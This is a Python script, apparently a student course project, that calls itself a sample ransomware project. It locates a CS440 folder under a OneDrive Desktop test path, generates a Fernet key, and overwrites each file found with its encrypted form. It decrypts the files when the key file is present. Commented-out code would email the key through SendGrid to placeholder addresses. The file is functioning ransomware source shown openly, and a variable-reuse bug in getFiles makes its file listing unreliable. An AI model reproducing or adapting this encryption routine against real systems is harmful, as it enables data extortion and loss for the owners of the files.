import sys
import subprocess

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography"]
for package in required_packages:
    print(f"Checking for {package}")
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        install(package)


import argparse
# import getpass
import os
import pathlib
# import smtplib
# import platform
from cryptography.fernet import Fernet
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from sendgrid import SendGridAPIClient
# from sendgrid.helpers.mail import Mail





def navigateToDir(directory):
    location = str(pathlib.Path.home()) + '\\' +'OneDrive' + '\\' + directory
    print(location)
    try:
        os.chdir(location)
        print(f"Succesfully navigated to: {location}")
        return location
    except Exception as e:
        print(f"Error occurred: {e}")
    
    return None
    

def getFiles(directory):
    files = []

    for root, sd, files in os.walk(directory):
        if "CS440" in sd:
            path = os.path.join(root, "CS440")
            for cs440root, cs440sd, cs440files in os.walk(path):
                for file in cs440files:
                    files.append(os.path.join(path, file))
            break
            
    return files


def generateKey():
    key = Fernet.generate_key()
    with open("symmetric_key.key", "wb") as keyfile:
        keyfile.write(key)
    print("generated")
#     sendEmail()

# def sendEmail():
#     keyfile = f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key"
#     message = Mail(
#         from_email='sender@example.com',  # Use a verified sender email
#         to_emails='receiver@example.com',
#         subject='Your Generated Symmetric Key',
#         html_content=f'{open(keyfile).read()}'
#     )
    
#     try:
#         sg = SendGridAPIClient('your_sendgrid_api_key')  # Replace with your SendGrid API key
#         response = sg.send(message)
#         print(f"Email sent! Status code: {response.status_code}")
#     except Exception as e:
#         print(f"Failed to send email via SendGrid. Error: {e}")

def encrypt(target):
    with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
        key = keyfile.read()
    key = Fernet(key)
    
    if target:
        for doc in target:
            print(f"Filename is: {doc}")
            with open(doc, "rb") as file:
                original = file.read()
            cipher = key.encrypt(original) 

            with open(doc, "wb") as encrypted_file:
                encrypted_file.write(cipher)
        
        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
    else:
        print("Target empty.")


def decrypt(target, key_path):

    with open(key_path, "rb") as key_file:
        FernetKey = key_file.read()
        print(type(FernetKey))
    key = Fernet(FernetKey)

    for doc in target:
        print(f"Decrypting {doc}")
        with open(doc, "rb") as encrypted_file:
            cipher = encrypted_file.read()
        original = key.decrypt(cipher)
        with open(doc, "wb") as decrypted_file:
            decrypted_file.write(original)



def start_point():
    parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
    args = parser.parse_args()


    file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
    if os.path.isfile(file_path):
        print(f"Decrypting with {file_path}")
        directory = navigateToDir("Desktop\\Test")
        target = getFiles(directory)
        decrypt(target, file_path)
    else:
        print("Encrypting")
        generateKey()
        directory = navigateToDir("Desktop\\Test")
        target = getFiles(directory)
        encrypt(target)